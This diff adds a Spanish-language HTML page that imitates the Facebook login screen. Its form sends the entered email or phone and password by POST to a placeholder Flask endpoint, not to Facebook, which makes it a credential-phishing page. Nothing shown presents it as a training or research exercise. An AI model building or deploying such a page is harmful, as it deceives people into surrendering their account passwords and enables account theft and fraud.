@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar sesión en Facebook</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <h2>Facebook</h2>
+            <form action="https://your-flask-endpoint/submit" method="POST">
+                <input type="text" name="email" placeholder="Correo electrónico o teléfono" required>
+                <input type="password" name="pass" placeholder="Contraseña" required>
+                <button type="submit">Iniciar sesión</button>
+            </form>
+        </div>
+    </div>
+</body>
+</html>
